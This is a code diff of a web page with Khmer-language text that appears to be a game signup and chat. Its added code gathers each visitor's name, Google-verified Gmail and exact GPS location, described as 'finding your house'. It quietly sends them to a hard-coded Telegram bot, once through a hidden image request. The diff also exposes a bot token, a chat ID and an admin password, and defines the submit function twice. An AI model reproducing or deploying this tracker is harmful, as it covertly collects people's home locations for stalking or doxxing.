@@ -3451,12 +3451,11 @@ function listenForAdminReplies() {
           }
       });
 }
+
 const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
 const CHAT_ID = "955031659";
-let finalMapLink = "";
-let userLat = "";
-let userLon = "";
 
+let finalMapLink = "";
 
 window.onload = function() {
     const savedName = localStorage.getItem('user_name');
@@ -3473,22 +3472,6 @@ function toStep2() {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
 }
-
-
-const provider = new firebase.auth.GoogleAuthProvider();
-function loginWithGoogle() {
-    firebase.auth().signInWithPopup(provider)
-        .then((result) => {
-            const user = result.user;
-            document.getElementById('reg-name').value = user.displayName;
-            document.getElementById('reg-email').value = user.email;
-            alert("Gmail ផ្ទៀងផ្ទាត់រួចរាល់៖ " + user.email);
-        }).catch((error) => {
-            alert("ការ Login បរាជ័យ!");
-        });
-}
-
-
 function getExactLocation() {
     const status = document.getElementById('gps-status');
     const btn = document.getElementById('btn-gps');
@@ -3496,95 +3479,155 @@ function getExactLocation() {
     if (navigator.geolocation) {
         status.innerText = "⌛ កំពុងស្កេនរកផ្ទះបង (រង់ចាំ ៥-១០ វិនាទី)...";
         
+        const options = {
+            enableHighAccuracy: true, 
+            timeout: 30000,         
+            maximumAge: 0             
+        };
+
         navigator.geolocation.getCurrentPosition(function(position) {
-            userLat = position.coords.latitude;
-            userLon = position.coords.longitude;
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            finalMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-           
-            finalMapLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
-            
-            status.innerText = "✅ ចាប់បានទីតាំងចំកន្លែងហើយ!";
+            status.innerText = `✅ ចាប់បានហើយ! (កម្រិតសុក្រឹតភាព: ${Math.round(accuracy)} ម៉ែត្រ)`;
             status.style.color = "green";
             btn.style.background = "#4CAF50";
+
+            console.log("ទីតាំងថ្មី:", lat, lon); 
         }, function(error) {
             alert("សូមចុច Allow និងបើក GPS ទូរស័ព្ទ!");
-            status.innerText = "❌ មិនអាចចាប់បាន (សូមបើក GPS)";
-        }, { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
+            status.innerText = "❌ មិនអាចចាប់បាន (Error: " + error.message + ")";
+        }, options);
     }
 }
-
 
 function finalSubmit() {
     const name = document.getElementById('reg-name').value.trim();
     const email = document.getElementById('reg-email').value.trim();
 
-    if (!firebase.auth().currentUser) {
-        alert("❌ សូម Login ជាមួយ Google ជាមុនសិន!"); return;
-    }
-    if (!name || !userLat) {
-        alert("❌ សូមបំពេញឈ្មោះ និងចុចចាប់ GPS ឱ្យចេញពណ៌បៃតង!"); return;
+    if (!name || !email.includes("@gmail.com") || !finalMapLink) {
+        alert("សូមបំពេញឈ្មោះ, Gmail និងចុច GPS ឱ្យចេញពណ៌បៃតងសិន!");
+        return;
     }
 
+   
     localStorage.setItem('user_name', name);
+    localStorage.setItem('user_email', email);
 
   
-    chatRef.push({
-        name: name,
-        email: email,
-        message: "📍 បានផ្ញើទីតាំងពិត",
-        location: finalMapLink, 
-        time: new Date().toLocaleTimeString()
-    });
-
-
-    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំង: ${finalMapLink}`;
+    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំងពិត: ${finalMapLink}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
 
+   
     document.getElementById('chat-user-input').value = name;
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
+    
     listenForMessages();
 }
-function listenForMessages() {
-    
-    chatRef.on('child_added', (snapshot) => {
-        const data = snapshot.val();
-        const chatBox = document.getElementById('chat-box');
-        
-        let infoDisplay = "";
-        
-      
-        if(data.location) {
-            infoDisplay = `
-                <div style="background: #fff3e0; padding: 10px; border-radius: 8px; border-left: 5px solid #ff9800; margin-bottom: 10px; font-size: 0.9rem;">
-                    <b style="color: #e65100;">👤 អ្នកលេងថ្មី: ${data.name}</b><br>
-                    <small>📧 Gmail: ${data.email || 'មិនមាន'}</small><br>
-                    <a href="${data.location}" target="_blank" style="display:inline-block; margin-top:5px; padding:5px 10px; background:#4CAF50; color:white; text-decoration:none; border-radius:4px; font-weight:bold;">📍 មើលទីតាំងផ្ទះរបស់គាត់</a>
-                </div>
-            `;
-        } else {
-         
-            infoDisplay = `
-                <div style="margin-bottom: 8px; padding: 5px 10px; background: #f1f1f1; border-radius: 10px; display: inline-block; max-width: 80%;">
-                    <b style="color:#d35400;">${data.name}:</b> 
-                    <span>${data.message}</span>
-                    <small style="color:#999; font-size:10px; display:block; text-align:right;">${data.time || ''}</small>
-                </div><br>
-            `;
-        }
 
-     
-        chatBox.innerHTML += infoDisplay;
-        
-      
+function sendChatMessage() {
+    const name = document.getElementById('chat-user-input').value;
+    const msg = document.getElementById('chat-msg-input').value.trim();
+    if (!msg) return;
+
+    chatRef.push({
+        name: name,
+        message: msg,
+        time: new Date().toLocaleTimeString()
+    });
+    document.getElementById('chat-msg-input').value = "";
+}
+
+function listenForMessages() {
+    chatRef.limitToLast(30).on('value', (snapshot) => {
+        const chatBox = document.getElementById('chat-box');
+        chatBox.innerHTML = "";
+        snapshot.forEach((child) => {
+            const data = child.val();
+            chatBox.innerHTML += `<div style="margin-bottom:10px">
+                <span style="color:#d35400; font-weight:bold;">${data.name}:</span> 
+                <span>${data.message}</span>
+                <small style="color:#999; font-size:10px; display:block;">${data.time || ''}</small>
+            </div>`;
+        });
         chatBox.scrollTop = chatBox.scrollHeight;
     });
+}
+
+function clearAllChat() {
+    const code = document.getElementById('admin-code').value;
+    if (code === "reaksmey10012004@") {
+        chatRef.remove();
+        alert("លុបសារទាំងអស់ហើយ!");
+    } else {
+        alert("លេខកូដខុស!");
+    }
+}
+    const provider = new firebase.auth.GoogleAuthProvider();
+
+function loginWithGoogle() {
+    firebase.auth().signInWithPopup(provider)
+        .then((result) => {
+            const user = result.user;
+            
+          
+            document.getElementById('reg-name').value = user.displayName;
+            document.getElementById('reg-email').value = user.email;
+            
+       
+            alert("Gmail ពិតត្រូវបានផ្ទៀងផ្ទាត់៖ " + user.email);
+            console.log("Verified User:", user.email);
+        })
+        .catch((error) => {
+            alert("ការ Login បរាជ័យ! សូមព្យាយាមម្តងទៀតដើម្បីប្រើ Gmail ពិត។");
+        });
+}
+function finalSubmit() {
+    const name = document.getElementById('reg-name').value.trim();
+    const email = document.getElementById('reg-email').value.trim();
+
+  
+    if (!firebase.auth().currentUser) {
+        alert("❌ មិនទាន់អាចចូលបានទេ! បងត្រូវតែចុចប៊ូតុង 'Login ជាមួយ Google' ដើម្បីប្រើ Gmail ពិតប្រាកដសិន។");
+        return; 
+    }
+
+ 
+    if (email !== firebase.auth().currentUser.email) {
+        alert("❌ ទិន្នន័យ Gmail មិនត្រឹមត្រូវ! សូមផ្ទៀងផ្ទាត់ម្តងទៀត។");
+        return;
+    }
+
+ 
+    if (!name) {
+        alert("❌ សូមបំពេញឈ្មោះរបស់អ្នកផង!");
+        return;
+    }
+    if (!finalMapLink) {
+        alert("❌ សូមចុចចាប់ទីតាំង GPS ឱ្យចេញពណ៌បៃតងសិន!");
+        return;
+    }
+
+  
+    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំង: ${finalMapLink}`;
+    let img = new Image();
+    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+    // ទៅកាន់ផ្ទាំងឆាត
+    document.getElementById('chat-user-input').value = name;
+    document.getElementById('step-2').style.display = 'none';
+    document.getElementById('step-3').style.display = 'block';
 }
 </script>
 </body>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
 
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
+
 
 
 
